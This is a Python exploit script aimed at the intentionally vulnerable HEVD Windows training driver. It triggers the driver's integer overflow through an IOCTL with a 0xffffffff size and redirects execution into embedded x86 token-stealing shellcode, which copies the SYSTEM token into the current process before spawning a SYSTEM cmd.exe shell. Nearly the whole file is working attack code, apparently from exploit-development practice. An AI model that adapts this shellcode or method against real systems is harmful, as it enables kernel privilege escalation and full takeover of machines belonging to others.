import os
from helper import *
from ctypes import *

def ioctl(function, devicetype = 0x00000022, access = 0x00000000, method = 0x00000003):
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def main():
	HEVD_IOCTL_INTEGER_OVERFLOW = ioctl(0x809)

	lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver"
	handle = get_handle(lpFileName)

	steal_token = (
		"\x60"                              # pushad
		"\x33\xc0"                          # xor   eax,eax
		"\x64\x8b\x80\x24\x01\x00\x00"      # mov   eax,DWORD PTR fs:[eax+0x124]
		"\x8b\x40\x50"                      # mov   eax,DWORD PTR [eax+0x50]
		"\x8b\xc8"                          # mov   ecx,eax
		"\x8b\x80\xb8\x00\x00\x00"          # mov   eax,DWORD PTR [eax+0xb8]
		"\x2d\xb8\x00\x00\x00"              # sub   eax,0xb8
		"\x83\xb8\xb4\x00\x00\x00\x04"      # cmp   DWORD PTR [eax+0xb4],0x4
		"\x75\xec"                          # jne   0xe
		"\x8b\x90\xf8\x00\x00\x00"          # mov   edx,DWORD PTR [eax+0xf8]
		"\x89\x91\xf8\x00\x00\x00"          # mov   DWORD PTR [ecx+0xf8],edx
		"\x61"                              # popad
		"\x33\xc0"                          # NTSTATUS -> STATUS_SUCCESS
		"\x5d"                              # pop ebp
		"\xc2\x08\x00"                      # ret 8
	)

	# Allocate 'shellcode' via VirtualAlloc()
	addr = alloc_memory_virtualalloc(0, len(steal_token), steal_token)
	shellcode_ptr = p32(addr)

	# Create a payload buffer with the magic value and the appopriate offset
	payload = create_string_buffer("\x41" * 0x828 + shellcode_ptr + p32(0xbad0b0b0))
	bad_size = 2**32-1 # 0xffffffff

	# Trigger the bug with the payload and the bad size (2^32-1) = 0xffffffff
	trigger(handle, HEVD_IOCTL_INTEGER_OVERFLOW, payload, bad_size)

	print("[+] Spawn SYSTEM shell\n")
	os.system("cmd.exe")

if __name__ == "__main__":
	main()
